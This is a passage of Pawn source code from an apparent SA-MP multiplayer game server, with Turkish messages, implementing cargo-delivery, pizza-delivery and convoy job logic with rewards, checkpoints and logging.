	        RewardPlayer(playerid, -1000, 0);

	        if(KargoOrtak[playerid] != -1)
	        {
	            RewardPlayer(KargoOrtak[playerid], -1000, 0);

	            BILGI(KargoOrtak[playerid], "Kargo aracý patladýðý için göreviniz iptal oldu! {FF4040}-1000$ Ceza");
	        }

	        BILGI(playerid, "Kargo aracý patladýðý için göreviniz iptal oldu! {FF4040}-1000$ Ceza");

	        StopKargocuGorev(playerid);
			break;
	    }
	}
}

// OnPlayerEnterKargoCheckpoint
OnPlayerEnterKargoCheckpoint(playerid)
{
	if(APlayerData[playerid][PlayerClass] != ClassKargocu) return 1;
	if(MeslekDurum[playerid] == 0) return 1;

	switch(MeslekDurum[playerid])
	{
	    case 1: // Kargo Yüklemeye Geldi
	    {
	        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Hata(playerid, "Kargo yüklerken kargo aracýnýn þoför koltuðunda olmalýsýnýz!"), BILGI(playerid, "Görevi COOP yapýyorsanýz ve yan koltukta iseniz dikkate almayýnýz.");
	        if(GetPlayerVehicleID(playerid) != KargoAraba[playerid]) return Hata(playerid, "Kargo yüklerken kargo aracýnýn þoför koltuðunda olmalýsýnýz!");
			if(KargoOrtak[playerid] == -1)
			{
			    TogglePlayerControllable(playerid, 0);

			    DisablePlayerCheckpoint(playerid);

			    MeslekDurum[playerid] = 2;

			    SetTimerEx("KargocumuSaliver", 3000, false, "i", playerid);

				GameTextForPlayer(playerid, "~g~Kargo Yukleniyor...", 3000, 5);

			    switch(MeslekSehir[playerid])
			    {
			        case SehirLosSantos:
			        {
			            SetPlayerCheckpoint(playerid, LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ], 5.0);
				    }

					case SehirSanFierro:
					{
			            SetPlayerCheckpoint(playerid, SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ], 5.0);
					}
			    }

			    BILGI(playerid, "Þimdi haritada kýrmýzý ile iþaretlenen bölgeye kargo daðýtýmýna gidin.");
			}else{
			    if(GetPlayerVehicleID(KargoOrtak[playerid]) != GetPlayerVehicleID(playerid)) return Hata(playerid, "Ortaðýnýzýn sizle ayný araçta bulunmasý gerekiyor!");
			    TogglePlayerControllable(playerid, 0);
			    TogglePlayerControllable(KargoOrtak[playerid], 0);

			    DisablePlayerCheckpoint(playerid);
			    DisablePlayerCheckpoint(KargoOrtak[playerid]);

			    MeslekDurum[playerid] = 2;
			    MeslekDurum[ KargoOrtak[playerid] ] = 2;

			    SetTimerEx("KargocumuSaliver", 3000, false, "i", playerid);

				GameTextForPlayer(playerid, "~g~Kargo Yukleniyor...", 3000, 5);
				GameTextForPlayer(KargoOrtak[playerid], "~g~Kargo Yukleniyor...", 3000, 5);

			    switch(MeslekSehir[playerid])
			    {
			        case SehirLosSantos:
			        {
			            SetPlayerCheckpoint(playerid, LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ], 2.0);
			            SetPlayerCheckpoint(KargoOrtak[playerid], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ], 2.0);
				    }

					case SehirSanFierro:
					{
			            SetPlayerCheckpoint(playerid, SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ], 2.0);
			            SetPlayerCheckpoint(KargoOrtak[playerid], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ], 2.0);
					}
			    }

			    BILGI(playerid, "Þimdi haritada kýrmýzý ile iþaretlenen bölgeye kargo daðýtýmýna gidin.");
			    BILGI(KargoOrtak[playerid], "Þimdi haritada kýrmýzý ile iþaretlenen bölgeye kargo daðýtýmýna gidin.");
			}
	    }

	    case 2,3,4,5,6: // Kargo Daðýtýyor
	    {
	        if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return Hata(playerid, "Kargo daðýtýmý için ayakta olmalýsýnýz!");
			new Float:oXa, Float:oYa, Float:oZa;
			GetVehiclePos(KargoAraba[playerid], oXa, oYa, oZa);
			if(!IsPlayerInRangeOfPoint(playerid, 10.0, oXa, oYa, oZa)) return Hata(playerid, "Kargo daðýtýrken kargo aracýnýn yakýnýnda bulunmanýz gerekiyor!");
			if(MeslekDurum[playerid] == 6)
			{
			    if(KargoOrtak[playerid] == -1)
			    {
			        TogglePlayerControllable(playerid, 0);

			        DisablePlayerCheckpoint(playerid);

			        GameTextForPlayer(playerid, "~g~Adrese Kargo Dagitiliyor...", 3000, 5);

			        SetTimerEx("KargocumuSaliver", 3000, false, "i", playerid);

			        MeslekDurum[playerid] = 7;

			    	switch(MeslekSehir[playerid])
			    	{
			        	case SehirLosSantos:
			        	{
							SetPlayerCheckpoint(playerid, LSKargoMerkez[0][LocX], LSKargoMerkez[0][LocY], LSKargoMerkez[0][LocZ], 10.0);
				    	}

						case SehirSanFierro:
						{
							SetPlayerCheckpoint(playerid, SFKargoMerkez[0][LocX], SFKargoMerkez[0][LocY], SFKargoMerkez[0][LocZ], 10.0);
						}
			    	}

			    	BILGI(playerid, "Þimdi kargo firmanýzýn merkezine geri dönerek görevi tamamlayýn.");
			    }else{
			        TogglePlayerControllable(playerid, 0);
			        TogglePlayerControllable(KargoOrtak[playerid], 0);

			        DisablePlayerCheckpoint(playerid);
			        DisablePlayerCheckpoint(KargoOrtak[playerid]);

			        GameTextForPlayer(playerid, "~g~Adrese Kargo Dagitiliyor...", 3000, 5);
			        GameTextForPlayer(KargoOrtak[playerid], "~g~Adrese Kargo Dagitiliyor...", 3000, 5);

			        SetTimerEx("KargocumuSaliver", 3000, false, "i", playerid);

			        MeslekDurum[playerid] = 7;
			        MeslekDurum[ KargoOrtak[playerid] ] = 7;

			    	switch(MeslekSehir[playerid])
			    	{
			        	case SehirLosSantos:
			        	{
							SetPlayerCheckpoint(playerid, LSKargoMerkez[0][LocX], LSKargoMerkez[0][LocY], LSKargoMerkez[0][LocZ], 10.0);
							SetPlayerCheckpoint(KargoOrtak[playerid], LSKargoMerkez[0][LocX], LSKargoMerkez[0][LocY], LSKargoMerkez[0][LocZ], 10.0);
				    	}

						case SehirSanFierro:
						{
							SetPlayerCheckpoint(playerid, SFKargoMerkez[0][LocX], SFKargoMerkez[0][LocY], SFKargoMerkez[0][LocZ], 10.0);
							SetPlayerCheckpoint(KargoOrtak[playerid], SFKargoMerkez[0][LocX], SFKargoMerkez[0][LocY], SFKargoMerkez[0][LocZ], 10.0);
						}
			    	}

			    	BILGI(playerid, "Þimdi kargo firmanýzýn merkezine geri dönerek görevi tamamlayýn.");
			    	BILGI(KargoOrtak[playerid], "Þimdi kargo firmanýzýn merkezine geri dönerek görevi tamamlayýn.");
			    }
			}else{
			    if(KargoOrtak[playerid] == -1)
			    {
			        TogglePlayerControllable(playerid, 0);

			        DisablePlayerCheckpoint(playerid);

			        GameTextForPlayer(playerid, "~g~Adrese Kargo Dagitiliyor...", 3000, 5);

			        SetTimerEx("KargocumuSaliver", 3000, false, "i", playerid);

			        MeslekDurum[playerid]++;

			    	switch(MeslekSehir[playerid])
			    	{
			        	case SehirLosSantos:
			        	{
			            	SetPlayerCheckpoint(playerid, LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocX], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocY], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocZ], 5.0);
				    	}

						case SehirSanFierro:
						{
			            	SetPlayerCheckpoint(playerid, SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocX], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocY], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocZ], 5.0);
						}
			    	}

			    	BILGI(playerid, "Þimdi bölgede iþaretlenen diðer adrese kargo daðýtýmý yapýn.");
			    }else{
			        TogglePlayerControllable(playerid, 0);
			        TogglePlayerControllable(KargoOrtak[playerid], 0);

			        DisablePlayerCheckpoint(playerid);
			        DisablePlayerCheckpoint(KargoOrtak[playerid]);

			        GameTextForPlayer(playerid, "~g~Adrese Kargo Dagitiliyor...", 3000, 5);
			        GameTextForPlayer(KargoOrtak[playerid], "~g~Adrese Kargo Dagitiliyor...", 3000, 5);

			        SetTimerEx("KargocumuSaliver", 3000, false, "i", playerid);

			        MeslekDurum[playerid]++;
			        MeslekDurum[ KargoOrtak[playerid] ]++;

			    	switch(MeslekSehir[playerid])
			    	{
			        	case SehirLosSantos:
			        	{
			            	SetPlayerCheckpoint(playerid, LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocX], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocY], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocZ], 2.0);
			            	SetPlayerCheckpoint(KargoOrtak[playerid], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocX], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocY], LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocZ], 2.0);
				    	}

						case SehirSanFierro:
						{
			            	SetPlayerCheckpoint(playerid, SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocX], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocY], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocZ], 2.0);
			            	SetPlayerCheckpoint(KargoOrtak[playerid], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocX], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocY], SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][ MeslekDurum[playerid]-2 ] ][LocZ], 2.0);
						}
			    	}

			    	BILGI(playerid, "Þimdi bölgede iþaretlenen diðer adrese kargo daðýtýmý yapýn.");
			    	BILGI(KargoOrtak[playerid], "Þimdi bölgede iþaretlenen diðer adrese kargo daðýtýmý yapýn.");
			    }
			}
		}

	    case 7: // Merkeze Dönüyor
	    {
			new VPara, VSkor, VEXP, Float:XFa, Float:YFa;
			new Float:ZFa, Float:MesafeOa, Mesafea;

			switch(MeslekSehir[playerid])
			{
	    		case SehirLosSantos:
	    		{
					XFa = (LSKargoMerkez[0][LocX] - LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX]);
					YFa = (LSKargoMerkez[0][LocY] - LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY]);
					ZFa = (LSKargoMerkez[0][LocZ] - LSKargoYer[ LSKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ]);
	    		}

	    		case SehirSanFierro:
	    		{
					XFa = (SFKargoMerkez[0][LocX] - SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocX]);
					YFa = (SFKargoMerkez[0][LocY] - SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocY]);
					ZFa = (SFKargoMerkez[0][LocZ] - SFKargoYer[ SFKargoBolge[ KargoBolgesi[playerid] ][Locs][0] ][LocZ]);
	    		}
			}

			MesafeOa = floatsqroot( (XFa*XFa) + (YFa*YFa) + (ZFa*ZFa) );
			Mesafea = floatround(MesafeOa);

			if(KargoOrtak[playerid] == -1)
			{
				VPara = (25 + 2) * Mesafea;
				VSkor = 5;
				VEXP = 5;
				EXP[playerid] = EXP[playerid] + VEXP;

				RewardPlayer(playerid, VPara, VSkor);

				new Yazi[1024];
				format(Yazi, 1024, "{DDDDDD}Mesafe\t{FFC000}%dm\n{DDDDDD}Kazanýlan Para\t{FFC000}%d$\n{DDDDDD}Kazanýlan Skor\t{FFC000}%d Skor\n{DDDDDD}Kazanýlan EXP\t{FFC000}%d EXP", Mesafea, VPara, VSkor, VEXP);
				ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Kargoculuk Görevi Tamamlandý", Yazi, "Kapat", "");

				APlayerData[playerid][StatsKargocuJobs]++;
				new Message[1024];
				format(Message, 1024, "Kargocu görevini baþarýyla bitirdi");
				SqlLogYaz(playerid, 7, Message);

				StopKargocuGorev(playerid);
			}else{
				VPara = (25 + 2) * Mesafea * 2;
				VSkor = 5  * 2;

				VEXP = 5;
				EXP[playerid] = EXP[playerid] + VEXP;
				EXP[KargoOrtak[playerid]] = EXP[KargoOrtak[playerid]] + VEXP;

				RewardPlayer(playerid, VPara, VSkor);
				RewardPlayer(KargoOrtak[playerid], VPara, VSkor);

				new Yazi[1024];
				format(Yazi, 1024, "{DDDDDD}Mesafe\t{FFC000}%dm\n{DDDDDD}Kazanýlan Para\t{FFC000}%d$\n{DDDDDD}Kazanýlan Skor\t{FFC000}%d Skor\n{DDDDDD}Kazanýlan EXP\t{FFC000}%d EXP", Mesafea, VPara, VSkor, VEXP);
				ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Kargoculuk Görevi Tamamlandý", Yazi, "Kapat", "");
				ShowPlayerDialog(KargoOrtak[playerid], 9999, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Kargoculuk Görevi Tamamlandý", Yazi, "Kapat", "");

				
                
				APlayerData[playerid][StatsKargocuJobs]++;
				APlayerData[ KargoOrtak[playerid] ][StatsKargocuJobs]++;
				new Message[1024];
				format(Message, 1024, "Kargocu görevini ortaðýyla birlikte baþarýyla bitirdi");
				SqlLogYaz(playerid, 7, Message);
				SqlLogYaz(KargoOrtak[playerid], 7, Message);
				
				if(APlayerData[KargoOrtak[playerid]][StatsKargocuJobs] >= 10)
				{
				    GivePlayerAchievement(KargoOrtak[playerid], KargocuAch, 1); // Baþarým Sistemi
				}
				if(APlayerData[playerid][StatsKargocuJobs] >= 10)
				{
				    GivePlayerAchievement(playerid, KargocuAch, 1); // Baþarým Sistemi
				}

				StopKargocuGorev(playerid);
			}
	    }
	}
	return 1;
}

// KargocumuSaliver
forward KargocumuSaliver(playerid);
public KargocumuSaliver(playerid)
{
	TogglePlayerControllable(playerid, 1);
	if(KargoOrtak[playerid] != -1) TogglePlayerControllable(KargoOrtak[playerid], 1);
	return 1;
}

// ************************************************************************************************************************************************************
// PPC_MissionsPBoy
// ************************************************************************************************************************************************************
// This function gets called whenever a Pboy player enters "/work"

Pboy_StartJob(playerid)

{

	// Setup local variables

	new HouseCounter, HousesInRange[200], DialogList[200];



	// First clear the house-list

	for (new i; i < 11; i++)

		APlayerData[playerid][PboyHouses][i] = 0;



	// Count how many owned houses are in range of the player

	for (new id = 1; id < MAX_HOUSES; id++)

	{

		// Check if the house is owned

		if (strcmp(HouseData[id][Owner], "-"))

		{

			// Check if the house is in range of the player

			if (IsPlayerInRangeOfPoint(playerid, PboyJobRange, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]))

			{

			    // Check if there aren't 200 in-range houses have been found yet

				if (HouseCounter < 888)

				{

					HousesInRange[HouseCounter] = id; // Store the HouseID in the list of in-range houses

					HouseCounter++; // Increase the number of owned houses in range of the player (range = 1000 meters)

				}

				else

				{

					break; // Stop searching for more houses (200 is the maximum)

				}

			}

		}

	}



	// Abort the mission if there are less than 2 houses in range and inform the player

	if (HouseCounter < 2)

	{

	    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Yakinlarda Pizza isteyen yok, baska bölgede deneyiniz.");

		return 0;

	}



	// Try to add the 3 lines to the dialog-list

	if (HouseCounter >= 2)

	{

	    format(DialogList, sizeof(DialogList), "2 Adet Pizza dagitin\n"); // Add the line to the dialog

		APlayerData[playerid][PboyMaxStep] = 2; // Set the number of houses for the job to 2

	}

	if (HouseCounter >= 5)

	{

	    format(DialogList, sizeof(DialogList), "%s 5 Adet Pizza dagitin\n", DialogList); // Add the line to the dialog

		APlayerData[playerid][PboyMaxStep] = 5; // Set the number of houses for the job to 5

	}

	if (HouseCounter >= 10)

	{

	    format(DialogList, sizeof(DialogList), "%s 10 Adet Pizza dagitin\n", DialogList); // Add the line to the dialog

		APlayerData[playerid][PboyMaxStep] = 10; // Set the number of houses for the job to 10

	}



	// Choose a random house for the first house to visit

	APlayerData[playerid][PboyHouses][1] = HousesInRange[random(HouseCounter)];

	// Now choose as many houses randomly as allowed, starting from the second

	for (new i = 2; i <= APlayerData[playerid][PboyMaxStep]; i++)

	{

		// Copy a random HouseID from the prepared list on in-range houses to the job-list

	    APlayerData[playerid][PboyHouses][i] = HousesInRange[random(HouseCounter)];



		// If the HouseID is the same as the previous HouseID (the player would visit the same house twice in a row)

		while (APlayerData[playerid][PboyHouses][i - 1] == APlayerData[playerid][PboyHouses][i])

			APlayerData[playerid][PboyHouses][i] = HousesInRange[random(HouseCounter)]; // Get a new random HouseID as long as the HouseID is the same as the previous one

	}



	// Let the player choose how many packages he wants to deliver

	ShowPlayerDialog(playerid, DialogPboySelectQuant, DIALOG_STYLE_LIST, "Kac adet Pizza dagitmak istersin", DialogList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);



	return 1;

}



// This function is called when the player has chosen how many packages he wants to deliver

Pboy_BeginJob(playerid)

{

	// Setup local variables

	new Step, HouseID, Float:x, Float:y, Float:z;



	// Job has started

	APlayerData[playerid][JobStarted] = true;

	// Store the vehicleID (required to be able to check if the player left his vehicle)

	APlayerData[playerid][VehicleID] = GetPlayerVehicleID(playerid);

	// Set jobstep to 1 (going to the first house)

	Step = 1;

	APlayerData[playerid][JobStep] = Step;

	// Get the HouseID of the house where the mission starts (the first house in the list of in-range owned house)

	HouseID = APlayerData[playerid][PboyHouses][Step];

	// Set the TextDraw so the player can see it

	//format(RouteText, 255, "~w~Pizza ~b~%i/%i~w~ Bunun Evine: ~r~%s", Step, APlayerData[playerid][PboyMaxStep], AHouseData[HouseID][HouseName]);

	//TextDrawSetString(APlayerData[playerid][MissionText], RouteText);

	// Grab the x, y, z positions for the first location

	x = HouseData[HouseID][houseX];

	y = HouseData[HouseID][houseY];

	z = HouseData[HouseID][houseZ];

	// Create a checkpoint where the player should deliver his package

	SetPlayerCheckpoint(playerid, x, y, z, 3);

	// Set the job-fail-time for the global vehicle-timer

	APlayerData[playerid][VehicleTimerTime] = Job_TimeToFailMission;

	// Send the player a message to inform him that the mission has started

	SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Pizzalari dagitmaya basla");
	//sonra yaparim

	//SetPlayerAttachedObject(playerid, 3, 1582, 2);



	return 1;

}







// This function is called when a Pboy enters a checkpoint

Pboy_OnPlayerEnterCheckpoint(playerid)

{

	// Setup local variables

	new Step, HouseID, Float:x, Float:y, Float:z, Name[24], Msg[128], Payment;



	// Check if the player is outside his vehicle while entering a checkpoint

	if (GetPlayerVehicleSeat(playerid) == -1)

	{

		// Check if all the packages haven't been delivered

		if (APlayerData[playerid][PboyMaxStep] != APlayerData[playerid][JobStep])

		{

			// First disable the current checkpoint

			DisablePlayerCheckpoint(playerid);

			// Let the player know he delivered a package

			GameTextForPlayer(playerid, TXT_PackageDeliveredpizzaGameText, 5000, 4);

			SendClientMessage(playerid, 0xFFFFFFFF, TXT_PackageDeliveredpizzaMessage);

			// Set next JobStep (next house)

			APlayerData[playerid][JobStep]++;

			Step = APlayerData[playerid][JobStep];

			// Get the HouseID of the house where the mission starts (the first house in the list of in-range owned house)

			HouseID = APlayerData[playerid][PboyHouses][Step];

			// Set the TextDraw so the player can see it

			//format(RouteText, 255, "~w~Pizza teslimi ~b~%i/%i~w~ Ev: ~r~%s", Step, APlayerData[playerid][PboyMaxStep], AHouseData[HouseID][HouseName]);

			//TextDrawSetString(APlayerData[playerid][MissionText], RouteText);

			// Grab the x, y, z positions for the first location

			x = HouseData[HouseID][houseX];

			y = HouseData[HouseID][houseY];

			z = HouseData[HouseID][houseZ];

			// Create a checkpoint where the player should deliver his package

			SetPlayerCheckpoint(playerid, x, y, z, 3);

		}

		else // All packages have been delivered, the player has to get paid now

		{

			// Get the player name

			GetPlayerName(playerid, Name, sizeof(Name));

			// Send a message to all players to inform them that this player completed a Pboy-job

			format(Msg, 128, TXT_PlayerCompletedPboyJob, Name, APlayerData[playerid][PboyMaxStep]);

			SendClientMessageToAll(0xFFFFFFFF, Msg);

			// Set a payment based on the number of packages

			Payment = APlayerData[playerid][PboyMaxStep] * Bani;

			// Pay the player money and give scorepoints, both based on the number of packages delivered
            if(VIP[playerid] == 1)
			{
            RewardPlayer(playerid, Payment*2, APlayerData[playerid][PboyMaxStep]*2);
            EXP[playerid] = EXP[playerid] + 2;
            SendClientMessage(playerid, -1, "VIP Bonusu 2kat skor, Para ve 2 EXP.");
			}
			else
			{
			RewardPlayer(playerid, Payment, APlayerData[playerid][PboyMaxStep]);
			}
			PlayerPlaySound(playerid, 1083, 0.0, 0.0, 10.0);

			// Send a message to let the player know he finished his mission and got paid

			format(Msg, 128, "Görevi tamamladýnýz $%i ve 5 EXP kazandýnýz.", Payment);

			SendClientMessage(playerid, 0xFFFFFFFF, Msg);

            

			// Increase the stats for completing a Pboy job

			APlayerData[playerid][StatsPboyJobs]++;
			new Message[1024];
			format(Message, 1024, "Pizzacý görevini baþarýyla bitirdi");
			SqlLogYaz(playerid, 7, Message);
			if(APlayerData[playerid][StatsPboyJobs] >= 10)
			{
			    GivePlayerAchievement(playerid, PizzaciAch, 1); // Baþarým Sistemi
			}
			
			
			EXP[playerid] = EXP[playerid] + 5;
			
			// End the current trucker job (clear mission-data)

			Pboy_EndJob(playerid);

			// Also save the data (in case the server crashes, progress would be lost)

			Oyuncu_Kaydet(playerid);

		}

	}

	else

	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_NeedOnFootToProceed);



	return 1;

}







// This function is used to stop any Pboy-mission that has been started

Pboy_EndJob(playerid)

{

	if (APlayerData[playerid][JobStarted] == true)

	{

		// Clear all data about the job from the player, so he can start a new one

		APlayerData[playerid][JobStarted] = false;

		APlayerData[playerid][JobStep] = 0;

		APlayerData[playerid][VehicleTimerTime] = 0;

		APlayerData[playerid][VehicleID] = 0;

		APlayerData[playerid][PboyMaxStep] = 0;



		// Clear the list of houses-in-range

		for (new i; i < 11; i++)

			APlayerData[playerid][PboyHouses][i] = 0;



		// Delete the checkpoint

		DisablePlayerCheckpoint(playerid);

		// Reset the missiontext

		//TextDrawSetString(APlayerData[playerid][MissionText], Pboy_NoJobText);

	}



	return 1;

}

// ************************************************************************************************************************************************************
// PPC_Convoys
// ************************************************************************************************************************************************************

// This include file holds all functions for doing convoys
forward Convoy_Timer(Convoy);

// This function is called only once and is used to setup the textdraws and default data for convoys
Convoys_Init()
{
	for (new i; i < MAX_CONVOYS; i++)
	{
		AConvoys[i][ConvoySifreli] = false;
	    /*
		AConvoys[i][ConvoyTextLeader] = TextDrawCreate(320.0, 1.0, " "); // Create the textdraw for the leader
		TextDrawSetShadow(AConvoys[i][ConvoyTextLeader], 1); // Reduce the shadow to 1
		TextDrawAlignment(AConvoys[i][ConvoyTextLeader], 2); // Align the convoy-infobar to the center for the leader
		TextDrawUseBox(AConvoys[i][ConvoyTextLeader], 1); // Set the missiontext to display inside a box
		TextDrawBoxColor(AConvoys[i][ConvoyTextLeader] ,0x00000066); // Set the box color of the missiontext

		AConvoys[i][ConvoyTextMember] = TextDrawCreate(320.0, 1.0, " "); // Create the textdraw for the members
		TextDrawSetShadow(AConvoys[i][ConvoyTextLeader], 1); // Reduce the shadow to 1
		TextDrawAlignment(AConvoys[i][ConvoyTextMember], 2); // Align the convoy-infobar to the center for the members
		TextDrawUseBox(AConvoys[i][ConvoyTextMember], 1); // Set the missiontext to display inside a box
		TextDrawBoxColor(AConvoys[i][ConvoyTextMember] ,0x00000066); // Set the box color of the missiontext
		*/
	}
}

// This function is used when a player selected an empty convoy-slot (the player will start the convoy and become the leader)
Convoy_Create(playerid, Convoya)
{
	// Setup local variables
	new Name[255], Msg[3000];

	// Get the name of the player
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player is allowed to create a convoy (he must be a trucker without a job and not part of a convoy yet)
	if (Convoy_PlayerAllowed(playerid))
	{
		// Set status of the convoy to "open"
		AConvoys[Convoya][Status] = CONVOY_OPEN;
		// Set the player as leader of the convoy
		AConvoys[Convoya][Members][0] = playerid;
		// Set the player as a member of a convoy
		APlayerData[playerid][InConvoy] = true;
		APlayerData[playerid][ConvoyID] = Convoya;
        ShowPlayerV5UI(playerid);

		// Set all other member-indices to "-1" (no player yet)
		for (new i = 1; i < CONVOY_MAX_MEMBERS; i++)
		    AConvoys[Convoya][Members][i] = -1;
		// Start the convoy-timer (this timer updates and checks everything for the whole convoy), it runs every second
		AConvoys[Convoya][ConvoyTimer] = SetTimerEx("Convoy_Timer", 1000, true, "i", Convoya);

		// Let all players know that this player wants to start a convoy
		format(Msg, 128, TXT_PlayerStartsConvoy, Name);
		SendClientMessageToAll(0xFFFFFFFF, Msg);
		format(Msg, 1024, "konvoy kurdu.");
    	SqlLogYaz(playerid, 6, Msg);
	}
}



// This function is used to let another player join a convoy
Convoy_Join(playerid, Convoy)
{
	// Setup local variables
	new Name[24], Msg[128];
	new convoyLeaderID = AConvoys[Convoy][Members][0];

	// Get the name of the player
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player is allowed to join the convoy (he must be a trucker without a job and not part of a convoy yet)
	if (Convoy_PlayerAllowed(playerid))
	{
	    // Check if the convoy isn't full already
		if (Convoy_CountMembers(Convoy) < CONVOY_MAX_MEMBERS)
		{
			// Inform all the members of the convoy that this player joined the convoy
			format(Msg, 128, TXT_PlayerJoinedConvoy, Name);
			Convoy_SendMessage(Convoy, Msg);
			// Inform the player that he joined the convoy
			SendClientMessage(playerid, 0xFFFFFFFF, TXT_YouJoinedConvoy);
			format(Msg, 1024, "%s isimli kisinin konvoyuna katýldý.", GetName(convoyLeaderID));
    		SqlLogYaz(playerid, 6, Msg);

			// Set the player as member of the convoy (find a free spot for this player)
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
			    if (AConvoys[Convoy][Members][i] == -1) // Check if this member-spot is empty
				{
					AConvoys[Convoy][Members][i] = playerid; // Put the player in this member-spot
					break; // Stop the for-loop
				}
			}
			// Set the player as a member of a convoy
			APlayerData[playerid][InConvoy] = true;
			APlayerData[playerid][ConvoyID] = Convoy;
            ShowPlayerV5UI(playerid);

			// Set the convoystatus as "Full" if all member-spots are occupied
			if (Convoy_CountMembers(Convoy) == CONVOY_MAX_MEMBERS)
			    AConvoys[Convoy][Status] = CONVOY_FULL;

			// Also update the player's missiontext to inform the player that he must wait for the leader to start a job
			//TextDrawSetString(APlayerData[playerid][MissionText], TXT_WaitingLeaderJob);
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, TXT_ConvoyFull);
	}
}



// This function is used to let a player leave a convoy (when he disconnects, finishes the convoy, when he dies, ...)
Convoy_Leave(playerid)
{
	// Setup local variables
	new Convoy, NumMembers, MemberID;

	// First theck if the player is part of a convoy
	if (APlayerData[playerid][InConvoy] == false)
	    return 1; // Exit the function if the player isn't part of a convoy

	// Get the convoy-id from the player
	Convoy = APlayerData[playerid][ConvoyID];

	// Get the number of members in the convoy
	NumMembers = Convoy_CountMembers(Convoy);

	// If there is only 1 member in the convoy (convoy will have no members if this one leaves), cancel the convoy
	if (NumMembers == 1)
	{
		// Cancel the convoy
		Convoy_Cancel(Convoy);
		// Exit the function
		return 1;
	}

	// Remove the player from the convoy
	APlayerData[playerid][InConvoy] = false;
	APlayerData[playerid][ConvoyID] = 0;
    ShowPlayerV5UI(playerid);

    // If the player is the leader
	if (AConvoys[Convoy][Members][0] == playerid)
	{
	    new Msg[1024];
	    format(Msg, 1024, "konvoyunu sildi.");
    	SqlLogYaz(playerid, 6, Msg);
		// Set another player as leader
		for (new j = 1; j < CONVOY_MAX_MEMBERS; j++)
		{
			// Get the playerid of the member
